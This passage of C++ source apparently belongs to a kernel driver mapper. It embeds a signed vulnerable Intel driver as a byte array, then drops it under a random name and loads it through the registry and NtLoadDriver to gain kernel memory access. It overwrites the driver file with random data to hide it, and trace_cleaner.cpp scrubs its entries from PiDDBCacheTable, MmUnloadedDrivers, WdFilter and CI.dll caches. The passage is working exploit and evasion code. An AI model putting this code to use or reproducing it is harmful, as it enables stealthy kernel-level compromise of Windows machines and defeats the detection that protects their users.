    0x96, 0xB9, 0x34, 0x96, 0x56, 0x50, 0xFA, 0xC6, 0xB9, 0xD4, 0xE4, 0x6E, 0x8C, 0x22, 0xC8, 0x18,
    0xEF, 0x5F, 0x6E, 0x5D, 0x43, 0x15, 0x13, 0x5A, 0x4F, 0x11, 0x2E, 0xE1, 0x43, 0xAE, 0x6A, 0x44,
    0x7C, 0xC8, 0x6F, 0xE3, 0xFB, 0xDE, 0xBF, 0x20, 0xF3, 0x8B, 0xFB, 0x1A, 0x7D, 0xF4, 0xCB, 0xEA,
    0xC0, 0x47, 0x5F, 0xAA, 0x5A, 0xC4, 0x9B, 0x5D, 0x4A, 0xC4, 0x11, 0x45, 0xB4, 0x00, 0x40, 0x1F,
    0x35, 0x5C, 0x18, 0x06, 0xA5, 0xCF, 0x92, 0x77, 0x72, 0xB7, 0xF1, 0xF5, 0xE7, 0x55, 0x46, 0xFB,
    0xB3, 0xED, 0x1E, 0xDA, 0x99, 0x49, 0xF8, 0x5A, 0x36, 0x8B, 0xD3, 0xED, 0xA1, 0xFF, 0x6F, 0x3D,
    0x25, 0x3D, 0x57, 0xA0, 0xB9, 0x75, 0x94, 0x1F, 0x44, 0x29, 0x79, 0x45, 0xD7, 0x29, 0x2C, 0xD0,
    0xBC, 0x2E, 0x4D, 0x32, 0xDA, 0x24, 0x57, 0x8D, 0x2C, 0x30, 0xE4, 0x93, 0x07, 0xE2, 0xE6, 0x02,
    0x8E, 0xEE, 0x53, 0xEF, 0x9A, 0xD8, 0x09, 0x16, 0xF9, 0xD0, 0xB1, 0x3F, 0x17, 0xF1, 0xB7, 0xB3,
    0x79, 0x67, 0x9B, 0x2D, 0x28, 0xD5, 0x06, 0x39, 0x87, 0x79, 0x0F, 0xF2, 0x42, 0xB2, 0xF2, 0x9A,
    0x31, 0xDB, 0x47, 0x0F, 0xCE, 0xF5, 0xBD, 0x97, 0x0C, 0xF3, 0xCE, 0x82, 0x02, 0xC9, 0xB6, 0x9F,
    0xB2, 0x69, 0x7F, 0x68, 0xB3, 0xA1, 0x82, 0x02, 0x0B, 0x30, 0x82, 0x02, 0x07, 0x06, 0x09, 0x2A,
    0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x06, 0x31, 0x82, 0x01, 0xF8, 0x30, 0x82, 0x01, 0xF4,
    0x02, 0x01, 0x01, 0x30, 0x72, 0x30, 0x5E, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06,
    0x13, 0x02, 0x55, 0x53, 0x31, 0x1D, 0x30, 0x1B, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x14, 0x53,
    0x79, 0x6D, 0x61, 0x6E, 0x74, 0x65, 0x63, 0x20, 0x43, 0x6F, 0x72, 0x70, 0x6F, 0x72, 0x61, 0x74,
    0x69, 0x6F, 0x6E, 0x31, 0x30, 0x30, 0x2E, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x27, 0x53, 0x79,
    0x6D, 0x61, 0x6E, 0x74, 0x65, 0x63, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x20, 0x53, 0x74, 0x61, 0x6D,
    0x70, 0x69, 0x6E, 0x67, 0x20, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x73, 0x20, 0x43, 0x41,
    0x20, 0x2D, 0x20, 0x47, 0x32, 0x02, 0x10, 0x0E, 0xCF, 0xF4, 0x38, 0xC8, 0xFE, 0xBF, 0x35, 0x6E,
    0x04, 0xD8, 0x6A, 0x98, 0x1B, 0x1A, 0x50, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02, 0x1A,
    0x05, 0x00, 0xA0, 0x5D, 0x30, 0x18, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09,
    0x03, 0x31, 0x0B, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x07, 0x01, 0x30, 0x1C,
    0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x05, 0x31, 0x0F, 0x17, 0x0D, 0x31,
    0x33, 0x31, 0x31, 0x31, 0x34, 0x31, 0x35, 0x32, 0x33, 0x32, 0x32, 0x5A, 0x30, 0x23, 0x06, 0x09,
    0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x04, 0x31, 0x16, 0x04, 0x14, 0xE4, 0x7B, 0x46,
    0x28, 0x1A, 0x0A, 0x97, 0xDE, 0xA3, 0x12, 0x49, 0x27, 0x2C, 0x3B, 0x8B, 0x11, 0x6A, 0x2A, 0xDF,
    0x0D, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00,
    0x04, 0x82, 0x01, 0x00, 0x64, 0x74, 0x6E, 0x03, 0x75, 0xCA, 0xAB, 0x84, 0x0C, 0x64, 0x50, 0x03,
    0xA4, 0x8A, 0x89, 0xAB, 0x94, 0x95, 0xC6, 0xC5, 0xC6, 0xF5, 0x12, 0x82, 0xAF, 0xC7, 0xD5, 0xDF,
    0xE5, 0xCE, 0xD8, 0x80, 0x9C, 0x64, 0x31, 0x1C, 0x4E, 0xC9, 0x55, 0xF6, 0xA2, 0x12, 0x8A, 0xBD,
    0x8D, 0x56, 0xE0, 0xE3, 0x7C, 0x12, 0x55, 0x1F, 0x22, 0xFD, 0xB8, 0x2B, 0x5C, 0xE2, 0xBC, 0xCB,
    0x02, 0xC6, 0x0A, 0x50, 0x21, 0x8D, 0x5B, 0x0C, 0xA3, 0x4D, 0x82, 0xF3, 0x8F, 0x5F, 0xF5, 0xB8,
    0xF9, 0xD3, 0x77, 0x96, 0xEC, 0xCD, 0xA3, 0x95, 0x07, 0x2B, 0x38, 0x9E, 0x98, 0x2A, 0x84, 0x7A,
    0xED, 0xD3, 0x38, 0xF1, 0xE4, 0xF2, 0x52, 0x25, 0x76, 0xDE, 0x47, 0x47, 0x1A, 0x09, 0x5E, 0x71,
    0xAF, 0x4F, 0x71, 0xDB, 0xA3, 0x3C, 0x85, 0xDE, 0xA1, 0x89, 0x32, 0xA6, 0xF1, 0xA2, 0xE2, 0x77,
    0x7D, 0x63, 0x24, 0x3C, 0xB0, 0x03, 0xF8, 0x5B, 0x00, 0x9E, 0x16, 0xC0, 0x83, 0x45, 0x38, 0xE6,
    0x1F, 0xEB, 0x62, 0x18, 0x61, 0x9A, 0x06, 0x58, 0xEB, 0x64, 0x29, 0x88, 0xD0, 0xB8, 0xB5, 0x33,
    0x9B, 0x5A, 0x7B, 0xE0, 0x24, 0xDC, 0x7F, 0x54, 0x87, 0x60, 0x1A, 0x4B, 0x53, 0x7F, 0x21, 0xF6,
    0x79, 0x24, 0xD9, 0x3E, 0x8C, 0x6A, 0x8B, 0x0C, 0xDD, 0xB8, 0x90, 0x06, 0xD8, 0x70, 0x31, 0xF0,
    0xC7, 0xEC, 0x5C, 0x06, 0x63, 0x62, 0xEA, 0x1A, 0x5C, 0x92, 0x96, 0x13, 0x26, 0x44, 0xE6, 0x07,
    0xD2, 0x66, 0x30, 0x8C, 0x05, 0xF0, 0xB0, 0x26, 0x38, 0x0B, 0x61, 0x39, 0x05, 0x44, 0xCF, 0x94,
    0x95, 0x2A, 0x8B, 0x44, 0x74, 0x2D, 0x5E, 0x66, 0x57, 0xBC, 0xE2, 0xCB, 0x97, 0x94, 0xC2, 0x3D,
    0x45, 0x12, 0xCE, 0x5C, 0x76, 0x58, 0x2D, 0xB0, 0x6F, 0xC7, 0x2E, 0xC2, 0x62, 0xC3, 0xB3, 0xCC,
    0x07, 0x60, 0xD4, 0x37, 0x00, 0x00, 0x00, 0x00};
const std::size_t service_manager_t::driver_resource_size_ = sizeof(driver_resource_);

// IO status block structure
typedef struct _IO_STATUS_BLOCK {
  union {
    NTSTATUS Status;
    PVOID Pointer;
  };
  ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
#ifdef MIDL_PASS
  [ size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT* Buffer;
#else   // MIDL_PASS
  _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
#endif  // MIDL_PASS
} UNICODE_STRING;

typedef UNICODE_STRING* PUNICODE_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;

// object attributes structure
typedef struct _OBJECT_ATTRIBUTES {
  ULONG Length;
  HANDLE RootDirectory;
  PUNICODE_STRING ObjectName;
  ULONG Attributes;
  PVOID SecurityDescriptor;
  PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) \
  {                                               \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);      \
    (p)->RootDirectory = r;                       \
    (p)->Attributes = a;                          \
    (p)->ObjectName = n;                          \
    (p)->SecurityDescriptor = s;                  \
    (p)->SecurityQualityOfService = NULL;         \
  }

// status definitions
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// DOS header signature
#define IMAGE_DOS_SIGNATURE 0x5A4D

#define OBJ_CASE_INSENSITIVE 0x00000040L
#define FILE_ANY_ACCESS 0
#define FILE_ATTRIBUTE_NORMAL 0x00000080
#define FILE_SHARE_READ 0x00000001
#define FILE_SHARE_WRITE 0x00000002
#define FILE_OPEN 0x00000001

extern "C" {
NTSTATUS NTAPI NtLoadDriver(IN PUNICODE_STRING DriverServiceName);
NTSTATUS NTAPI NtUnloadDriver(IN PUNICODE_STRING DriverServiceName);
NTSTATUS NtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
                      PVOID IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
                      ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions,
                      PVOID EaBuffer, ULONG EaLength);
NTSTATUS NtClose(HANDLE Handle);
void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS NTAPI RtlAdjustPrivilege(_In_ ULONG Privilege, _In_ BOOLEAN Enable, _In_ BOOLEAN Client,
                                  _Out_ PBOOLEAN WasEnabled);
}

auto service_manager_t::load_vulnerable_driver() -> HANDLE {
  std::srand(static_cast<unsigned>(std::time(nullptr)) * g_utils->get_current_thread_id());

  if (is_driver_running()) {
    mapper_log("ERROR", "\\Device\\Nal is already in use.");
    return INVALID_HANDLE_VALUE;
  }

  // gen random driver name
  driver_name_ = generate_random_driver_name();
  mapper_log("INFO", "loading vulnerable driver, name: %ws", get_driver_path().c_str());

  auto driver_path = get_driver_path();
  if (driver_path.empty()) {
    mapper_log("ERROR", "can't find temp folder");
    return INVALID_HANDLE_VALUE;
  }

  // remove existing file
  _wremove(driver_path.c_str());

  // create driver file
  if (create_driver_file().empty()) {
    mapper_log("ERROR", "failed to create vulnerable driver file");
    return INVALID_HANDLE_VALUE;
  }

  // register and start service
  if (!register_and_start_service(driver_path)) {
    mapper_log("ERROR", "failed to register and start service for vulnerable driver");
    _wremove(driver_path.c_str());
    return INVALID_HANDLE_VALUE;
  }

  // open device handle
  auto result = open_device_handle();
  if (!result || result == INVALID_HANDLE_VALUE) {
    mapper_log("ERROR", "failed to open device handle to vulnerable driver");
    unload_vulnerable_driver(result);
    return INVALID_HANDLE_VALUE;
  }

  return result;
}

auto service_manager_t::unload_vulnerable_driver(HANDLE device_handle) -> bool {
  mapper_log("INFO", "unloading vulnerable driver");
  if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
    NtClose(device_handle);
  }

  if (!stop_and_remove_service(std::wstring(driver_name_.begin(), driver_name_.end()))) {
    return false;
  }

  auto driver_path = get_driver_path();

  // Destroy disk information before unlink
  std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
  auto new_file_len =
      static_cast<int>(driver_resource_size_) +
      (((static_cast<long long>(rand()) * static_cast<long long>(rand())) % 2000000) + 1000);

  auto random_data = std::make_unique<std::uint8_t[]>(new_file_len);
  for (auto i = 0; i < new_file_len; i++) {
    random_data[i] = static_cast<std::uint8_t>(rand() % 255);
  }

  if (!file_ofstream.write(reinterpret_cast<char*>(random_data.get()), new_file_len)) {
    mapper_log("INFO", "error dumping inside the disk");
  } else {
    mapper_log("SUCCESS", "vulnerable driver data destroyed before unlink");
  }

  file_ofstream.close();

  // Remove the file
  if (_wremove(driver_path.c_str()) != 0) {
    return false;
  }

  return true;
}

auto service_manager_t::is_driver_running() -> bool {
  UNICODE_STRING device_name;
  RtlInitUnicodeString(&device_name, L"\\Device\\Nal");

  OBJECT_ATTRIBUTES obj_attr;
  InitializeObjectAttributes(&obj_attr, &device_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

  IO_STATUS_BLOCK io_status_block;
  HANDLE file_handle;

  auto status = NtCreateFile(&file_handle, FILE_ANY_ACCESS, &obj_attr, &io_status_block, NULL,
                             FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN,
                             0, NULL, 0);

  if (NT_SUCCESS(status)) {
    NtClose(file_handle);
    return true;
  }

  return false;
}

auto service_manager_t::register_and_start_service(const std::wstring& driver_path) -> bool {
  constexpr DWORD service_type_kernel = 1;
  auto driver_name_w = std::wstring(driver_name_.begin(), driver_name_.end());
  auto services_path = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name_w;
  auto n_path = L"\\??\\" + driver_path;

  HKEY dservice;
  auto status = RegCreateKeyW(HKEY_LOCAL_MACHINE, services_path.c_str(), &dservice);
  if (status != ERROR_SUCCESS) {
    mapper_log("ERROR", "can't create service key");
    return false;
  }

  status = RegSetKeyValueW(dservice, NULL, L"ImagePath", REG_EXPAND_SZ, n_path.c_str(),
                           static_cast<DWORD>(n_path.size() * sizeof(wchar_t)));
  if (status != ERROR_SUCCESS) {
    RegCloseKey(dservice);
    mapper_log("ERROR", "can't create 'ImagePath' registry value");
    return false;
  }

  status = RegSetKeyValueW(dservice, NULL, L"Type", REG_DWORD, &service_type_kernel, sizeof(DWORD));
  if (status != ERROR_SUCCESS) {
    RegCloseKey(dservice);
    mapper_log("ERROR", "can't create 'Type' registry value");
    return false;
  }

  RegCloseKey(dservice);

  // adjust privilege
  if (!acquire_load_driver_privilege()) {
    return false;
  }

  auto wdriver_reg_path =
      L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name_w;
  UNICODE_STRING service_str;
  RtlInitUnicodeString(&service_str, wdriver_reg_path.c_str());

  auto nt_status = NtLoadDriver(&service_str);
  mapper_log("INFO", "NtLoadDriver status: 0x%lx", nt_status);
  if (nt_status == 0xC000010E) {  // STATUS_IMAGE_ALREADY_LOADED
    return true;
  }

  return NT_SUCCESS(nt_status);
}

auto service_manager_t::stop_and_remove_service(const std::wstring& driver_name) -> bool {
  auto wdriver_reg_path =
      L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name;
  UNICODE_STRING service_str;
  RtlInitUnicodeString(&service_str, wdriver_reg_path.c_str());

  HKEY driver_service;
  auto services_path = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
  auto status = RegOpenKeyW(HKEY_LOCAL_MACHINE, services_path.c_str(), &driver_service);

  if (status != ERROR_SUCCESS) {
    if (status == ERROR_FILE_NOT_FOUND) {
      return true;
    }
    return false;
  }

  RegCloseKey(driver_service);

  auto st = NtUnloadDriver(&service_str);
  mapper_log("INFO", "NtUnloadDriver status: 0x%lx", st);

  if (st != 0x0) {
    mapper_log("ERROR", "driver unload failed");
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, services_path.c_str());
    return false;
  }

  status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, services_path.c_str());
  return status == ERROR_SUCCESS;
}

auto service_manager_t::verify_driver_integrity(HANDLE device_handle, std::uint64_t ntoskrnl_addr)
    -> bool {
  // check MZ signature of ntoskrnl.exe
  IMAGE_DOS_HEADER dos_header = {0};
  if (!g_memory_manager->read_memory(device_handle, ntoskrnl_addr, &dos_header,
                                     sizeof(IMAGE_DOS_HEADER)) ||
      dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
    mapper_log("ERROR", "can't exploit vulnerable driver");
    return false;
  }

  return true;
}

auto service_manager_t::check_for_hooks(HANDLE device_handle) -> bool {
  // TODO: Implement comprehensive hook detection
  return true;
}

auto service_manager_t::get_driver_path() const -> std::wstring {
  auto temp_path = g_utils->get_temp_path();
  if (temp_path.empty()) {
    return L"";
  }
  return temp_path + L"\\" + std::wstring(driver_name_.begin(), driver_name_.end());
}

auto service_manager_t::create_driver_file() -> std::wstring {
  auto driver_path = get_driver_path();
  if (driver_path.empty()) {
    return L"";
  }

  if (!g_utils->create_file_from_memory(
          driver_path, reinterpret_cast<const char*>(driver_resource_), driver_resource_size_)) {
    return L"";
  }

  return driver_path;
}

auto service_manager_t::destroy_driver_file(const std::wstring& driver_path) -> void {
  // overwrite with random data first
  std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
  if (file_ofstream.is_open()) {
    auto random_size = driver_resource_size_ + 1000;
    auto random_data = std::make_unique<std::uint8_t[]>(random_size);

    for (std::size_t i = 0; i < random_size; i++) {
      random_data[i] = static_cast<std::uint8_t>(rand() % 256);
    }

    file_ofstream.write(reinterpret_cast<char*>(random_data.get()), random_size);
    file_ofstream.close();
  }

  // delete the file
  DeleteFileW(driver_path.c_str());
}

auto service_manager_t::generate_random_driver_name() -> std::string {
  constexpr char alphanum[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

  auto len = (rand() % 20) + 10;  // 10-30 characters
  std::string result;
  result.reserve(len);

  for (auto i = 0; i < len; ++i) {
    result += alphanum[rand() % (sizeof(alphanum) - 1)];
  }

  return result;
}

auto service_manager_t::acquire_load_driver_privilege() -> bool {
  constexpr ULONG se_load_driver_privilege = 10UL;
  BOOLEAN se_load_driver_was_enabled;

  ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
  BOOLEAN SeLoadDriverWasEnabled;
  NTSTATUS Status =
      RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
  if (!NT_SUCCESS(Status)) {
    mapper_log("ERROR", "fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. make sure you "
                        "are running as administrator.");
    return false;
  }

  return true;
}

auto service_manager_t::acquire_debug_privilege() -> bool {
  constexpr ULONG se_debug_privilege = 20UL;
  BOOLEAN se_debug_was_enabled;

  return true;
}

auto service_manager_t::open_device_handle() -> HANDLE {
  UNICODE_STRING device_name;
  RtlInitUnicodeString(&device_name, (L"\\Device\\Nal"));

  // init OBJECT_ATTRIBUTES
  OBJECT_ATTRIBUTES obj_attr;
  InitializeObjectAttributes(&obj_attr, &device_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

  IO_STATUS_BLOCK ioStatusBlock;
  HANDLE result;

  // open the device using NtCreateFile
  auto status = NtCreateFile(&result, GENERIC_READ | GENERIC_WRITE, &obj_attr, &ioStatusBlock, NULL,
                             FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, 0, NULL, 0);

  if (!NT_SUCCESS(status)) {
    mapper_log("ERROR", "failed to open device using NtCreateFile");
    return INVALID_HANDLE_VALUE;
  }

  return result;
}
```

`client/driver_mapper/service_manager.hpp`:

```hpp
#pragma once

#include <Windows.h>
#include <string>
#include <memory>

class service_manager_t {
public:
  service_manager_t() = default;
  ~service_manager_t() = default;

  // drv loading/unloading
  auto load_vulnerable_driver() -> HANDLE;
  auto unload_vulnerable_driver(HANDLE device_handle) -> bool;
  auto is_driver_running() -> bool;

  // service management
  auto register_and_start_service(const std::wstring& driver_path) -> bool;
  auto stop_and_remove_service(const std::wstring& driver_name) -> bool;

  // drv verification
  auto verify_driver_integrity(HANDLE device_handle, std::uint64_t ntoskrnl_addr) -> bool;
  auto check_for_hooks(HANDLE device_handle) -> bool;

  // getters
  auto get_driver_name() const -> const std::string& {
    return driver_name_ + ".sys";
  }
  auto get_driver_name_w() -> std::wstring {
    std::wstring name(driver_name_.begin(), driver_name_.end());
    return name;
  }
  auto get_driver_path() const -> std::wstring;

private:
  // drv resource management
  auto create_driver_file() -> std::wstring;
  auto destroy_driver_file(const std::wstring& driver_path) -> void;
  auto generate_random_driver_name() -> std::string;

  // privilege management
  auto acquire_load_driver_privilege() -> bool;
  auto acquire_debug_privilege() -> bool;

  // device communication
  auto open_device_handle() -> HANDLE;

  // member variables
  std::string driver_name_;

  // vuln driver resource
  static const unsigned char driver_resource_[];
  static const std::size_t driver_resource_size_;

  // consts
  static constexpr std::uint32_t iqvw64e_timestamp = 0x5284EAC3;
};

// global instance
inline std::unique_ptr<service_manager_t> g_service_manager = std::make_unique<service_manager_t>();
```

`client/driver_mapper/trace_cleaner.cpp`:

```cpp
#include "trace_cleaner.hpp"
#include "memory_manager.hpp"
#include "service_manager.hpp"
#include <iostream>
#include <vector>
#include <memory>
#include <set>

// forward declarations for external NT functions
extern "C" {
NTSTATUS NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                  PVOID SystemInformation, ULONG SystemInformationLength,
                                  PULONG ReturnLength);
NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
                                 PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
                             ULONG FreeType);
}

auto trace_cleaner_t::clean_all_traces(HANDLE device_handle, const std::string& driver_name)
    -> bool {
  bool success = true;
  mapper_log("SUCCESS", "starting trace cleaning process...");

  // clean PiDDB cache table
  if (!clear_piddb_cache_table(device_handle, driver_name)) {
    mapper_log("ERROR", "failed to clear PiDDB cache table");
    success = false;
  }

  // clean kernel hash bucket list
  if (!clear_kernel_hash_bucket_list(device_handle, driver_name)) {
    mapper_log("ERROR", "failed to clear kernel hash bucket list");
    success = false;
  }

  // clean MmUnloadedDrivers
  if (!clear_mm_unloaded_drivers(device_handle, driver_name)) {
    mapper_log("ERROR", "failed to clear MmUnloadedDrivers");
    success = false;
  }

  // clean WdFilter driver list
  if (!clear_wd_filter_driver_list(device_handle, driver_name)) {
    mapper_log("ERROR", "failed to clear WdFilter driver list");
    success = false;
  }

  // clean CI.dll EaCache and Validation lookaside lists
  if (!clear_ci_lookaside_lists(device_handle)) {
    mapper_log("ERROR", "failed to clear CI.dll EaCache and Validation lookaside list");
    success = false;
  }

  // dump MiPinDriverAddressLog, clear entries if 2nd argument is true
  if (!clear_pin_driver_address_log(device_handle, true)) {
    mapper_log("ERROR", "failed to enumerate MiPinDriverAddressLog");
    success = false;
  }

  return success;
}

auto trace_cleaner_t::clear_piddb_cache_table(HANDLE device_handle, const std::string& driver_name)
    -> bool {
  mapper_log("SUCCESS", "clearing PiDDB cache table...");

  auto piddb_lock_addr = g_driver_mapper->get_pdb_offsets().PiDDBLock;
  auto piddb_cache_table_addr = g_driver_mapper->get_pdb_offsets().PiDDBCacheTable;

  if (!piddb_lock_addr || !piddb_cache_table_addr) {
    mapper_log("ERROR", "failed to resolve PiDDB addresses");
    return false;
  }

  // acquire exclusive lock
  if (!acquire_resource_exclusive(device_handle, reinterpret_cast<void*>(piddb_lock_addr), true)) {
    mapper_log("ERROR", "failed to acquire PiDDB lock");
    return false;
  }

  // find the actual driver name and entry address by enumerating all entries
  auto [actual_driver_name, found_entry_addr] =
      find_driver_in_piddb_entries(device_handle, piddb_cache_table_addr);

  if (actual_driver_name.empty() || !found_entry_addr) {
    mapper_log("ERROR", "failed to find intel driver entry in PiDDB table");
    release_resource(device_handle, reinterpret_cast<void*>(piddb_lock_addr));
    return false;
  }

  mapper_log("SUCCESS", "found intel driver entry within PiDDB entries: %ws at address: 0x%llx",
             actual_driver_name.c_str(), found_entry_addr);

  // read the full entry to get LIST_ENTRY for unlinking
  piddb_cache_entry_t found_entry = {};
  if (!g_memory_manager->read_memory(device_handle, found_entry_addr, &found_entry,
                                     sizeof(found_entry))) {
    mapper_log("ERROR", "failed to read PiDDB entry");
    release_resource(device_handle, reinterpret_cast<void*>(piddb_lock_addr));
    return false;
  }

  if (!unlink_list_entry(device_handle, found_entry_addr)) {
    mapper_log("ERROR", "failed to unlink PiDDB entry from list");
    release_resource(device_handle, reinterpret_cast<void*>(piddb_lock_addr));
    return false;
  }

  // delete from AVL table
  if (!delete_element_generic_table_avl(device_handle,
                                        reinterpret_cast<void*>(piddb_cache_table_addr),
                                        reinterpret_cast<void*>(found_entry_addr))) {
    mapper_log("ERROR", "failed to delete from PiDDB AVL table");
    release_resource(device_handle, reinterpret_cast<void*>(piddb_lock_addr));
    return false;
  }

  // decrement delete count
  std::uint32_t delete_count = 0;
  if (g_memory_manager->read_memory(
          device_handle, piddb_cache_table_addr + offsetof(rtl_avl_table_t, delete_count),
          &delete_count, sizeof(std::uint32_t))) {
    if (delete_count > 0) {
      delete_count--;
      g_memory_manager->write_memory(
          device_handle, piddb_cache_table_addr + offsetof(rtl_avl_table_t, delete_count),
          &delete_count, sizeof(std::uint32_t));
    }
  }

  // release lock
  release_resource(device_handle, reinterpret_cast<void*>(piddb_lock_addr));

  mapper_log("SUCCESS", "PiDDB cache table cleaned successfully");
  return true;
}

auto trace_cleaner_t::print_pe_process_hash_bucket_list(HANDLE device_handle) -> bool {
  mapper_log("SUCCESS", "printing g_PEProcessHashBucketList contents...");

  std::uint64_t ci_base = g_utils->get_kernel_module_address("ci.dll");
  if (!ci_base) {
    mapper_log("ERROR", "failed to find ci.dll module");
    return false;
  }

  auto g_pe_process_hash_bucket_list = g_driver_mapper->get_pdb_offsets().g_PEProcessHashBucketList;
  auto g_hash_cache_lock = g_driver_mapper->get_pdb_offsets().g_HashCacheLock;

  if (!g_pe_process_hash_bucket_list || !g_hash_cache_lock) {
    mapper_log("ERROR", "failed to get g_PEProcessHashBucketList or g_HashCacheLock addresses");
    return false;
  }

  if (!acquire_resource_exclusive(device_handle, reinterpret_cast<void*>(g_hash_cache_lock),
                                  true)) {
    mapper_log("ERROR", "failed to lock g_HashCacheLock");
    return false;
  }

  // read the first bucket pointer (g_PEProcessHashBucketList is a pointer to the first bucket)
  pe_process_hash_bucket_t* current_bucket = nullptr;
  if (!g_memory_manager->read_memory(device_handle, g_pe_process_hash_bucket_list, &current_bucket,
                                     sizeof(current_bucket))) {
    mapper_log("ERROR", "failed to read g_PEProcessHashBucketList");
    release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
    return false;
  }

  if (!current_bucket) {
    mapper_log("SUCCESS", "g_PEProcessHashBucketList is empty");
    release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
    return true;
  }

  int bucket_count = 0;
  int total_entries = 0;

  // iterate through hash buckets (for ( k = g_PEProcessHashBucketList; k; k = (_QWORD *)*k ))
  while (current_bucket) {
    bucket_count++;
    mapper_log("INFO", "Processing bucket %d at address: 0x%llx", bucket_count,
               reinterpret_cast<std::uint64_t>(current_bucket));

    // read the full bucket header
    pe_process_hash_bucket_t bucket_header;
    if (!g_memory_manager->read_memory(device_handle,
                                       reinterpret_cast<std::uint64_t>(current_bucket),
                                       &bucket_header, sizeof(bucket_header))) {
      mapper_log("ERROR", "failed to read bucket header data");
      release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
      return false;
    }

    mapper_log("INFO", "  pid: %llu (0x%llx)",
               reinterpret_cast<std::uint64_t>(bucket_header.process_id),
               reinterpret_cast<std::uint64_t>(bucket_header.process_id));
    mapper_log("INFO", "  entry count: %d", bucket_header.entry_count);
    mapper_log("INFO", "  flag1 (offset 0x28): %d", bucket_header.flag1);
    mapper_log("INFO", "  flag2 (offset 0x2C): %d", bucket_header.flag2);

    // check if bucket has entries (if ( *((_DWORD *)k + 0xA) ))
    if (bucket_header.flag1) {
      hash_bucket_entry_t* current_entry = bucket_header.entry_list;
      int entry_count = 0;

      mapper_log("INFO", "  entry list starts at: 0x%llx",
                 reinterpret_cast<std::uint64_t>(current_entry));

      // iterate through entries in this bucket
      while (current_entry) {
        entry_count++;
        total_entries++;

        mapper_log("INFO", "    processing entry %d at address: 0x%llx", entry_count,
                   reinterpret_cast<std::uint64_t>(current_entry));

        // read the entry data
        hash_bucket_entry_t entry_data;
        if (!g_memory_manager->read_memory(device_handle,
                                           reinterpret_cast<std::uint64_t>(current_entry),
                                           &entry_data, sizeof(entry_data))) {
          mapper_log("ERROR", "failed to read entry data");
          release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
          return false;
        }

        // check entry flag at offset 0x40 (*((_DWORD *)v7 + 16) or v7[8] & flags)
        std::uint32_t entry_flag = 0;
        if (!g_memory_manager->read_memory(device_handle,
                                           reinterpret_cast<std::uint64_t>(current_entry) + 0x40,
                                           &entry_flag, sizeof(entry_flag))) {
          mapper_log("ERROR", "failed to read entry flag");
          release_resource(device_handle, reinterpret_cast<void*>(g_hash_cache_lock));
          return false;
        }

        mapper_log("INFO", "      entry flag (offset 0x40): 0x%X", entry_flag);

        // print certificate hash (from hash_bucket_entry_t.cert_hash)
        mapper_log("INFO", "      cert hash: %08X %08X %08X %08X %08X", entry_data.cert_hash[0],
                   entry_data.cert_hash[1], entry_data.cert_hash[2], entry_data.cert_hash[3],
                   entry_data.cert_hash[4]);

        // read the driver name
        USHORT name_len = 0;
